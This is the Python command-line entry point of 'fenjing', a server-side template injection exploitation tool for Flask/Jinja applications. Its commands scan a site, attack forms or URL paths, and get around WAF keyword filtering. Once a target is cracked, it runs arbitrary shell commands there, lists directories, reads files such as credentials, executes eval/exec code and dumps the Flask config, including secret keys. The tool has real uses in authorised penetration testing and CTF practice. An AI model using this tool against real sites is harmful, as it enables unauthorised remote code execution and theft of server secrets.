"""命令行界面的入口

"""
import logging
import time

from urllib.parse import urlparse
from typing import List, Dict, Tuple, Union
from functools import partial

import click

from .const import (
    ENVIRONMENT_JINJA,
    OS_POPEN_READ,
    CONFIG,
    EVAL,
    REPLACED_KEYWORDS_STRATEGY_AVOID,
    STRING,
    DEFAULT_USER_AGENT,
    DETECT_MODE_ACCURATE,
)
from .colorize import colored, set_enable_coloring
from .cracker import Cracker, EvalArgsModePayloadGen
from .form import Form, get_form
from .full_payload_gen import FullPayloadGen
from .requester import Requester
from .submitter import Submitter, PathSubmitter, FormSubmitter, shell_tamperer
from .scan_url import yield_form
from .webui import main as webui_main
from .interact import interact

set_enable_coloring()

TITLE = colored(
    "yellow",
    r"""
    ____             _ _
   / __/__  ____    (_|_)___  ____ _
  / /_/ _ \/ __ \  / / / __ \/ __ `/
 / __/  __/ / / / / / / / / / /_/ /
/_/  \___/_/ /_/_/ /_/_/ /_/\__, /
              /___/        /____/

    ------Made with passion by Marven11
""".strip(
        "\n"
    ),
    bold=True,
)

LOGGING_FORMAT = "%(levelname)s:[%(name)s] | %(message)s"
logging.basicConfig(level=logging.INFO, format=LOGGING_FORMAT)
logger = logging.getLogger("cli")


class RunFailed(Exception):
    """用于通知main和unit test运行失败的exception"""


def do_submit_cmdexec(
    cmd: str,
    submitter: Submitter,
    full_payload_gen_like: Union[FullPayloadGen, EvalArgsModePayloadGen],
) -> str:
    """使用FullPayloadGen生成shell命令payload, 然后使用submitter发送至对应服务器, 返回回显
    如果cmd以%>开头，则将其作为fenjing内部命令解析

    内部命令如下：
    - get-config: 获得当前的config
    - eval: 让目标python进程执行eval，解析命令后面的部分

    Args:
        cmd (str): payload对应的命令
        submitter (Submitter): 实际发送请求的submitter
        full_payload_gen_like (FullPayloadGen): 生成payload的FullPayloadGen

    Returns:
        str: 回显
    """
    payload, will_print = None, None
    # 解析命令
    if cmd[0] == "@":
        cmd = cmd[1:]
        if cmd.startswith("get-config"):
            payload, will_print = full_payload_gen_like.generate(CONFIG)
        elif cmd.startswith("eval"):
            payload, will_print = full_payload_gen_like.generate(
                EVAL, (STRING, cmd[4:].strip())
            )
        elif cmd.startswith("ls"):
            cmd = cmd.strip()
            if len(cmd) == 2: # ls
                payload, will_print = full_payload_gen_like.generate(
                    EVAL, (STRING, "__import__('os').listdir()")
                )
            else: # ls xxx
                payload, will_print = full_payload_gen_like.generate(
                    EVAL, (STRING, f"__import__('os').listdir({repr(cmd[2:].strip())})")
                )
        elif cmd.startswith("cat"):
            filepath = cmd[3:].strip()
            payload, will_print = full_payload_gen_like.generate(
                EVAL, (STRING, f"open({repr(filepath)}, 'r').read()")
            )
        elif cmd.startswith("exec"):
            statements = cmd[4:].strip()
            payload, will_print = full_payload_gen_like.generate(
                EVAL, (STRING, f"exec({repr(statements)})")
            )
        else:
            logging.warning("Please check your command")
            return ""
    else:
        payload, will_print = full_payload_gen_like.generate(OS_POPEN_READ, cmd)
    # 使用payload
    if payload is None:
        logger.warning("%s generating payload.", colored("red", "Failed"))
        return ""
    logger.info("Submit payload %s", colored("blue", payload))
    if not will_print:
        payload_wont_print = (
            "Payload generator says that this payload %s command execution result."
        )
        logger.warning(payload_wont_print, colored("red", "won't print"))
    result = submitter.submit(payload)
    assert result is not None
    return result.text


def parse_headers_cookies(headers_list: List[str], cookies: str) -> Dict[str, str]:
    """将headers列表和cookie字符串解析为可以传给requests的字典

    Args:
        headers_list (List[str]): headers列表，元素的格式为'Key: value'
        cookies (str): Cookie字符串

    Returns:
        Dict[str, str]: Headers字典
    """
    headers = {}
    if headers_list:
        for header in headers_list:
            key, _, value = header.partition(": ")
            if not key or not value:
                logger.warning("Failed parsing %s, ignored.", repr(header))
                continue
            if key.capitalize() != key:
                logger.warning("Header %s is not capitalized, fixed.", key)
                key = key.capitalize()
            headers[key] = value
    if cookies:
        headers["Cookie"] = cookies
    return headers


def do_crack_form_pre(
    url: str,
    form: Form,
    requester: Requester,
    detect_mode: str,
    replaced_keyword_strategy: str,
    environment: str,
    tamper_cmd: Union[str, None],
) -> Union[Tuple[FullPayloadGen, Submitter], None]:
    """攻击一个表单并获得结果

    Args:
        url (str): 表单所在的url
        form (Form): 表单
        requester (Requester): 发起请求的类
        detect_mode (str): 分析模式
        tamper_cmd (Union[str, None]): tamper命令，用于在提交时修改payload

    Returns:
        Union[Tuple[FullPayloadGen, Submitter], None]: 攻击结果
    """
    for input_field in form["inputs"]:
        submitter = FormSubmitter(
            url,
            form,
            input_field,
            requester,
        )
        if tamper_cmd:
            tamperer = shell_tamperer(tamper_cmd)
            submitter.add_tamperer(tamperer)
        cracker = Cracker(
            submitter=submitter,
            detect_mode=detect_mode,
            replaced_keyword_strategy=replaced_keyword_strategy,
            environment=environment,
        )
        if not cracker.has_respond():
            return None
        full_payload_gen = cracker.crack()
        if full_payload_gen:
            return full_payload_gen, submitter
    return None


def do_crack_form_eval_args_pre(
    url: str,
    form: Form,
    requester: Requester,
    detect_mode: str,
    replaced_keyword_strategy: str,
    environment: str,
    tamper_cmd: Union[str, None],
) -> Union[Tuple[Submitter, EvalArgsModePayloadGen], None]:
    """攻击一个表单并获得结果，但是将payload放在GET/POST参数中提交

    Args:
        url (str): 表单所在的url
        form (Form): 表单
        requester (Requester): 发起请求的类
        detect_mode (str): 分析模式
        tamper_cmd (Union[str, None]): tamper命令，用于在提交时修改payload

    Returns:
        Union[Tuple[Submitter, bool], None]: 攻击结果
    """
    for input_field in form["inputs"]:
        submitter = FormSubmitter(
            url,
            form,
            input_field,
            requester,
        )
        if tamper_cmd:
            tamperer = shell_tamperer(tamper_cmd)
            submitter.add_tamperer(tamperer)
        cracker = Cracker(
            submitter=submitter,
            detect_mode=detect_mode,
            replaced_keyword_strategy=replaced_keyword_strategy,
            environment=environment,
        )
        if not cracker.has_respond():
            return None
        result = cracker.crack_eval_args()
        if result:
            submitter, evalargs_payload_gen = result
            return submitter, evalargs_payload_gen
    return None


def do_crack_path_pre(
    url: str,
    requester: Requester,
    detect_mode: str,
    replaced_keyword_strategy: str,
    environment: str,
    tamper_cmd: Union[str, None],
) -> Union[Tuple[FullPayloadGen, Submitter], None]:
    """攻击一个路径并获得payload生成器

    Args:
        url (str): 需要攻击的url
        requester (Requester): 发送请求的类
        detect_mode (str): 分析模式
        tamper_cmd (Union[str, None]): tamper命令

    Returns:
        Union[Tuple[FullPayloadGen, Submitter], None]: 攻击结果
    """
    submitter = PathSubmitter(url=url, requester=requester)
    if tamper_cmd:
        tamperer = shell_tamperer(tamper_cmd)
        submitter.add_tamperer(tamperer)
    cracker = Cracker(
        submitter=submitter,
        detect_mode=detect_mode,
        replaced_keyword_strategy=replaced_keyword_strategy,
        environment=environment,
    )
    if not cracker.has_respond():
        return None
    full_payload_gen = cracker.crack()
    if full_payload_gen is None:
        return None
    return full_payload_gen, submitter


def do_crack(
    full_payload_gen: FullPayloadGen, submitter: Submitter, exec_cmd: Union[str, None]
):
    """使用payload生成器攻击对应的表单参数/路径

    Args:
        full_payload_gen (FullPayloadGen): payload生成器
        submitter (Submitter): payload提交器，用于提交payload到特定的表单/路径
        exec_cmd (Union[str, None]): 需要执行的命令
    """
    cmd_exec_func = partial(
        do_submit_cmdexec,
        submitter=submitter,
        full_payload_gen_like=full_payload_gen,
    )
    if exec_cmd:
        print(cmd_exec_func(exec_cmd))
    else:
        interact(cmd_exec_func)


def do_crack_eval_args(
    submitter: Submitter,
    eval_args_payloadgen: EvalArgsModePayloadGen,
    exec_cmd: Union[str, None],
):
    """攻击对应的表单参数/路径，但是使用eval_args方法

    Args:
        submitter (Submitter): payload提交器，用于提交payload到特定的表单/路径
        eval_args_payloadgen (EvalArgsModePayloadGen): EvalArgs的payload生成器
        exec_cmd (Union[str, None]): 需要执行的命令
    """
    cmd_exec_func = partial(
        do_submit_cmdexec,
        submitter=submitter,
        full_payload_gen_like=eval_args_payloadgen,
    )
    if exec_cmd:
        print(cmd_exec_func(exec_cmd))
    else:
        interact(cmd_exec_func)


def do_get_config(full_payload_gen: FullPayloadGen, submitter: Submitter) -> bool:
    """攻击对应的目标并获得config

    Args:
        full_payload_gen (FullPayloadGen): payload生成器
        submitter (Submitter): payload提交器

    Returns:
        bool: 是否成功
    """
    payload, will_print = full_payload_gen.generate(CONFIG)
    if not payload:
        logger.error("The generator %s generating payload", colored("red", "failed"))
        return False
    if not will_print:
        logger.error(
            "The generated payload %s respond config.",
            colored("red", "won't"),
        )
        return False
    resp = submitter.submit(payload)
    assert resp is not None, "Submit failed"
    print(resp.text)
    return True


@click.group()
def main():
    """click的命令组"""


@main.command()
@click.option("--url", "-u", help="form所在的URL")
@click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
@click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
@click.option("--inputs", "-i", help="form的参数，以逗号分隔")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option(
    "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
)
@click.option(
    "--replaced-keyword-strategy",
    default=REPLACED_KEYWORDS_STRATEGY_AVOID,
    help="WAF替换关键字时的策略，可为avoid/ignore/doubletapping",
)
@click.option(
    "--environment",
    default=ENVIRONMENT_JINJA,
    help="模板的执行环境，默认为flask的render_template_string函数",
)
@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
@click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
@click.option("--cookies", default="", help="请求时使用的Cookie")
@click.option("--proxy", default="", help="请求时使用的代理")
@click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
def get_config(
    url: str,
    action: str,
    method: str,
    inputs: str,
    interval: float,
    detect_mode: str,
    replaced_keyword_strategy: str,
    environment: str,
    user_agent: str,
    header: tuple,
    cookies: str,
    proxy: str,
    tamper_cmd: str,
):
    """
    攻击指定的表单，并获得目标服务器的flask config
    """
    print(TITLE)
    print(
        "This command is DEPRECATED, you should just pass `-e '%%get-config'` to\ncrack command for the flask config of the target"
    )
    print("`get-config`命令即将废弃，请在crack命令上使用`-e '%%get-config'`参数获得目标的flask config")
    time.sleep(10)
    assert all(param is not None for param in [url, inputs]), "Please check your param"
    form = get_form(
        action=action or urlparse(url).path,
        method=method,
        inputs=inputs.split(","),
    )
    requester = Requester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        proxy=proxy,
    )
    result = do_crack_form_pre(
        url,
        form,
        requester,
        detect_mode,
        replaced_keyword_strategy,
        environment,
        tamper_cmd,
    )
    if not result:
        logger.warning("Test form failed...")
        raise RunFailed()
    full_payload_gen, submitter = result
    success = do_get_config(full_payload_gen, submitter)
    if not success:
        raise RunFailed()


@main.command()
@click.option("--url", "-u", help="form所在的URL")
@click.option("--action", "-a", default=None, help="form的action，默认为当前路径")
@click.option("--method", "-m", default="POST", help="form的提交方式，默认为POST")
@click.option("--inputs", "-i", help="form的参数，以逗号分隔")
@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option(
    "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
)
@click.option(
    "--replaced-keyword-strategy",
    default=REPLACED_KEYWORDS_STRATEGY_AVOID,
    help="WAF替换关键字时的策略，可为avoid/ignore/doubletapping",
)
@click.option(
    "--environment",
    default=ENVIRONMENT_JINJA,
    help="模板的执行环境，默认为flask的render_template_string函数",
)
@click.option(
    "--eval-args-payload",
    default=False,
    is_flag=True,
    help="[试验性]是否在GET参数中传递Eval payload",
)
@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
@click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
@click.option("--cookies", default="", help="请求时使用的Cookie")
@click.option("--extra-params", default=None, help="请求时的额外GET参数，如a=1&b=2")
@click.option("--extra-data", default=None, help="请求时的额外POST参数，如a=1&b=2")
@click.option("--proxy", default="", help="请求时使用的代理")
@click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
def crack(
    url: str,
    action: str,
    method: str,
    inputs: str,
    exec_cmd: str,
    interval: float,
    detect_mode: str,
    replaced_keyword_strategy: str,
    environment: str,
    eval_args_payload: bool,
    user_agent: str,
    header: tuple,
    cookies: str,
    extra_params: str,
    extra_data: str,
    proxy: str,
    tamper_cmd: str,
):
    """
    攻击指定的表单
    """
    print(TITLE)
    assert all(param is not None for param in [url, inputs]), "Please check your param"
    form = get_form(
        action=action or urlparse(url).path,
        method=method,
        inputs=inputs.split(","),
    )
    requester = Requester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
    )
    if not eval_args_payload:
        result = do_crack_form_pre(
            url,
            form,
            requester,
            detect_mode,
            replaced_keyword_strategy,
            environment,
            tamper_cmd,
        )
        if not result:
            logger.warning("Test form failed...")
            raise RunFailed()
        full_payload_gen, submitter = result
        do_crack(full_payload_gen, submitter, exec_cmd)
    else:
        result = do_crack_form_eval_args_pre(
            url,
            form,
            requester,
            detect_mode,
            replaced_keyword_strategy,
            environment,
            tamper_cmd,
        )
        if not result:
            logger.warning("Test form failed...")
            raise RunFailed()
        submitter, evalargs_payload_gen = result
        do_crack_eval_args(submitter, evalargs_payload_gen, exec_cmd)


@main.command()
@click.option("--url", "-u", help="需要攻击的URL")
@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则成功后进入交互模式")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option(
    "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
)
@click.option(
    "--replaced-keyword-strategy",
    default=REPLACED_KEYWORDS_STRATEGY_AVOID,
    help="WAF替换关键字时的策略，可为avoid/ignore/doubletapping",
)
@click.option(
    "--environment",
    default=ENVIRONMENT_JINJA,
    help="模板的执行环境，默认为flask的render_template_string函数",
)
@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
@click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
@click.option("--cookies", default="", help="请求时使用的Cookie")
@click.option("--extra-params", default=None, help="请求时的额外GET参数，如a=1&b=2")
@click.option("--extra-data", default=None, help="请求时的额外POST参数，如a=1&b=2")
@click.option("--proxy", default="", help="请求时使用的代理")
@click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
def crack_path(
    url: str,
    exec_cmd: str,
    interval: float,
    detect_mode: str,
    replaced_keyword_strategy: str,
    environment: str,
    user_agent: str,
    header: tuple,
    cookies: str,
    extra_params: str,
    extra_data: str,
    proxy: str,
    tamper_cmd: str,
):
    """
    攻击指定的路径
    """
    assert url is not None, "Please provide URL!"
    print(TITLE)
    requester = Requester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
    )
    result = do_crack_path_pre(
        url,
        requester,
        detect_mode,
        replaced_keyword_strategy,
        environment,
        tamper_cmd,
    )
    if not result:
        logger.warning("Test form failed...")
        raise RunFailed()
    full_payload_gen, submitter = result
    do_crack(full_payload_gen, submitter, exec_cmd)


@main.command()
@click.option("--url", "-u", help="需要扫描的URL")
@click.option("--exec-cmd", "-e", default="", help="成功后执行的shell指令，不填则进入交互模式")
@click.option("--interval", default=0.0, help="每次请求的间隔")
@click.option(
    "--detect-mode", default=DETECT_MODE_ACCURATE, help="检测模式，可为accurate或fast"
)
@click.option(
    "--replaced-keyword-strategy",
    default=REPLACED_KEYWORDS_STRATEGY_AVOID,
    help="WAF替换关键字时的策略，可为avoid/ignore/doubletapping",
)
@click.option(
    "--environment",
    default=ENVIRONMENT_JINJA,
    help="模板的执行环境，默认为flask的render_template_string函数",
)
@click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
@click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
@click.option("--cookies", default="", help="请求时使用的Cookie")
@click.option("--extra-params", default=None, help="请求时的额外GET参数，如a=1&b=2")
@click.option("--extra-data", default=None, help="请求时的额外POST参数，如a=1&b=2")
@click.option("--proxy", default="", help="请求时使用的代理")
@click.option("--tamper-cmd", default="", help="在发送payload之前进行编码的命令，默认不进行额外操作")
def scan(
    url,
    exec_cmd,
    interval,
    detect_mode,
    replaced_keyword_strategy,
    environment,
    user_agent,
    header,
    cookies,
    extra_params,
    extra_data,
    proxy,
    tamper_cmd: str,
):
    """
    扫描指定的网站
    """
    print(TITLE)
    requester = Requester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
    )
    url_forms = (
        (page_url, form)
        for (page_url, forms) in yield_form(requester, url)
        for form in forms
    )
    for page_url, form in url_forms:
        logger.warning("Scan form: %s", colored("blue", repr(form)))
        result = do_crack_form_pre(
            page_url,
            form,
            requester,
            detect_mode,
            replaced_keyword_strategy,
            environment,
            tamper_cmd,
        )
        if not result:
            continue
        full_payload_gen, submitter = result
        do_crack(full_payload_gen, submitter, exec_cmd)
        return
    logger.warning("Scan failed...")
    raise RunFailed()


@main.command()
@click.option("--host", "-h", default="127.0.0.1", help="需要监听的host, 默认为127.0.0.1")
@click.option("--port", "-p", default=11451, help="需要监听的端口, 默认为11451")
def webui(host, port):
    """
    启动webui
    """
    webui_main(host, port)


if __name__ == "__main__":
    main()
